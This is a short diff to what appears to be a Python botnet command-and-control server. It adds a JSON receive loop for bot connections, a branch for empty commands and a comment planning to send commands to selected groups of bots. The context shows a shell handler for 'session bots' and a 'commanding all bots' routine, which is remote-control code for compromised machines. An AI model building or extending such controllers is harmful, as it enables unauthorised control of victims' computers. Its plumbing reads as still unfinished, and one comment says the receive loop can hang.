@@ -16,6 +16,19 @@ def send2all(target, data):
     json_data = json.dumps(data)
     target.send(json_data.encode('utf-8'))
 
+
+####################################################################################
+# Not yet because with command that does not return anything will cause the program to hang --> Need to have a thought 
+def recv_from_all(target):
+        data = ""
+        while True:
+            try:
+                data = data + target.recv(1024).decode('utf-8') # HERE IS WHERE DATA RECV DECODED FOR JSON MANIPULATION
+                return json.loads(data)
+            except ValueError:
+                continue
+####################################################################################
+
 # Interacting with the session bots
 def shell(target, ip):
 
@@ -190,6 +203,16 @@ while True:
                 i += 1
         except:
             print("[-] Failed commanding all bots!")
+# """
+# Idea about send a group of bots:
+# - Command as input: cmd = "sendall 1,2,3,4 command"
+# - Do research about cut string at space maybe ??    
+# - Get the array: target_array = cmd[7:].split(',') --> Get array [1,2,3,4]
+# - Use while, do a loop list of targets: targets[int(target_array)]
+# """
 
+
+    elif command == "":
+        continue
     else:
         print("[-] Command Doesn't Exist!")
